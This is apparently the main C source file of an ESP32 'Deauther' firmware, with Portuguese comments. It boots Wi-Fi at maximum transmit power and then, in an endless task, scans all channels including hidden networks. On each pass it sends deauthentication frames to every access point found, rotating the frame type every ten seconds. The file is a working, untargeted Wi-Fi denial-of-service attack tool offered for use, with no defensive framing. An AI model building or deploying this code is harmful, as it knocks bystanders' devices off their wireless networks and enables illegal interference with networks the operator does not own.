#include "esp_event.h"
#include "esp_log.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_wifi_types_generic.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "nvs_flash.h"
#include "wsl_bypasser.h"
#include "led_control.h"
#include <stdio.h>
#include <string.h>

#define WIFI_SCAN_LIST_SIZE 10
static const char *TAG = "wifi_deauther";

static void wifi_event_handler(void *arg, esp_event_base_t event_base,
                               int32_t event_id, void *event_data) {
  if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
    ESP_LOGI(TAG, "Wi-Fi STA iniciado, pronto para escaneamento");
    led_blink_green(); // Sucesso ao iniciar STA
  } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_START) {
    ESP_LOGI(TAG, "Wi-Fi AP iniciado");
    led_blink_green(); // Sucesso ao iniciar AP
  } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_SCAN_DONE) {
    ESP_LOGI(TAG, "Escaneamento Wi-Fi concluído");
    led_blink_blue(); // Info para scan concluído
  }
                               }

                               static void wifi_init(void) {
                                 // Inicializa NVS
                                 esp_err_t ret = nvs_flash_init();
                                 if (ret == ESP_ERR_NVS_NO_FREE_PAGES ||
                                   ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
                                   ESP_ERROR_CHECK(nvs_flash_erase());
                                 ret = nvs_flash_init();
                                   }
                                   if (ret != ESP_OK) {
                                     ESP_LOGE(TAG, "Falha ao inicializar NVS: %s", esp_err_to_name(ret));
                                     led_blink_red(); // Erro na inicialização do NVS
                                     return;
                                   }
                                   ESP_ERROR_CHECK(ret);

                                   // Inicializa a pilha de rede
                                   ESP_ERROR_CHECK(esp_netif_init());
                                   ESP_ERROR_CHECK(esp_event_loop_create_default());
                                   esp_netif_create_default_wifi_sta();

                                   // Configura o Wi-Fi
                                   wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
                                   ESP_ERROR_CHECK(esp_wifi_init(&cfg));

                                   // Registra o manipulador de eventos
                                   ESP_ERROR_CHECK(esp_event_handler_instance_register(
                                     WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, NULL, NULL));

                                   // Define o modo Wi-Fi como STA
                                   ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));

                                   // Configura o STA
                                   wifi_config_t sta_config = {
                                     .sta = {
                                       .ssid = "MyNetwork",
                                       .password = "MyPassword123",
                                       .scan_method = WIFI_ALL_CHANNEL_SCAN,
                                       .failure_retry_cnt = 0,
                                     },
                                   };
                                   ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &sta_config));

                                   // Inicia o Wi-Fi
                                   ESP_ERROR_CHECK(esp_wifi_start());

                                   // Configura a potência de transmissão
                                   ESP_ERROR_CHECK(esp_wifi_set_max_tx_power(84)); // 21 dBm

                                   ESP_LOGI(TAG, "Wi-Fi inicializado no modo STA");
                                   led_blink_green(); // Sucesso na inicialização do Wi-Fi
                               }

                               static void scan_and_deauth(void *pvParameters) {
                                 static deauth_frame_type_t current_type = DEAUTH_INVALID_AUTH;

                                 while (1) {
                                   wifi_ap_record_t ap_info[WIFI_SCAN_LIST_SIZE];
                                   uint16_t ap_count = WIFI_SCAN_LIST_SIZE;
                                   memset(ap_info, 0, sizeof(ap_info));

                                   // Configura o scan
                                   wifi_scan_config_t scan_config = {
                                     .ssid = NULL,
                                     .bssid = NULL,
                                     .channel = 0,
                                     .show_hidden = true,
                                   };

                                   // Inicia o scan (bloqueante)
                                   esp_err_t ret = esp_wifi_scan_start(&scan_config, true);
                                   if (ret != ESP_OK) {
                                     ESP_LOGE(TAG, "Falha ao iniciar scan: %s", esp_err_to_name(ret));
                                     led_blink_red(); // Erro ao iniciar scan
                                     vTaskDelay(1000 / portTICK_PERIOD_MS);
                                     continue;
                                   }

                                   // Obtém os resultados do scan
                                   ret = esp_wifi_scan_get_ap_records(&ap_count, ap_info);
                                   if (ret != ESP_OK) {
                                     ESP_LOGE(TAG, "Falha ao obter resultados do scan: %s", esp_err_to_name(ret));
                                     led_blink_red(); // Erro ao obter resultados
                                     vTaskDelay(1000 / portTICK_PERIOD_MS);
                                     continue;
                                   }
                                   ESP_LOGI(TAG, "Encontrados %d pontos de acesso:", ap_count);
                                   led_blink_blue(); // Info para resultados obtidos

                                   // Envia frame de deauth para cada AP encontrado
                                   for (int i = 0; i < ap_count; i++) {
                                     ESP_LOGI(TAG, "AP %d: SSID=%s, RSSI=%d", i, ap_info[i].ssid,
                                              ap_info[i].rssi);
                                     wsl_bypasser_send_deauth_frame(&ap_info[i], current_type);
                                   }

                                   // Alterna o tipo de frame para o próximo scan
                                   current_type = (current_type + 1) % DEAUTH_TYPE_COUNT;
                                   const char *type_str = (current_type == DEAUTH_INVALID_AUTH)
                                   ? "INVALID_AUTH"
                                   : (current_type == DEAUTH_INACTIVITY) ? "INACTIVITY"
                                   : "CLASS3";
                                   ESP_LOGI(TAG, "Mudando para tipo de deauth: %s", type_str);
                                   led_blink_blue(); // Piscar azul ao mudar método

                                   vTaskDelay(10000 / portTICK_PERIOD_MS); // Aguarda 10 segundos
                                 }
                               }

                               void app_main(void) {
                                 ESP_LOGI(TAG, "Iniciando ESP32 Deauther");

                                 // Reduz o nível de log do Wi-Fi para evitar mensagens verbosas
                                 esp_log_level_set("wifi", ESP_LOG_WARN);

                                 // Inicializa o LED RGB
                                 led_rgb_init();

                                 wifi_init();

                                 // Cria task para scan e deauth
                                 xTaskCreate(scan_and_deauth, "scan_and_deauth", 4096, NULL, 5, NULL);
                               }
